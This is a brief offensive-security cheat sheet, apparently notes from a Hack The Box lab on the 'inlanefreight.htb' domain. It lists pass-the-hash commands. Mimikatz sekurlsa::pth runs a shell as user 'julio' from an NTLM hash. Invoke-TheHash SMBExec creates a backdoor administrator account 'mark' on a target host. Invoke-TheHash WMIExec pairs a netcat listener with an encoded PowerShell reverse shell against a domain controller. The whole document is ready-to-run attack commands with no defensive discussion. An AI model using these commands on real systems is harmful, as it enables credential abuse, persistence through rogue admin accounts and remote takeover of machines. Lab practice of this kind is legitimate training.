# MIMIKATZ
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```


# INVOKE-THE HASH SMB COMMAND EXEC
!!!!!!!!!!! JULIO NEEDS ADMINRIGHTS ON THE TARGET !!!!!!!!!!!  
`https://github.com/Kevin-Robertson/Invoke-TheHash`  
```
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```


# INVOKE-THE HASH WMI COMMAND EXEC
!!!!!!!!!!! JULIO NEEDS ADMINRIGHTS ON THE TARGET !!!!!!!!!!!  
`https://github.com/Kevin-Robertson/Invoke-TheHash`  
```
Import-Module .\Invoke-TheHash.psd1
.\nc.exe -lvnp 8001
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e BASE_64_REV_SHELL_STRING"
```
















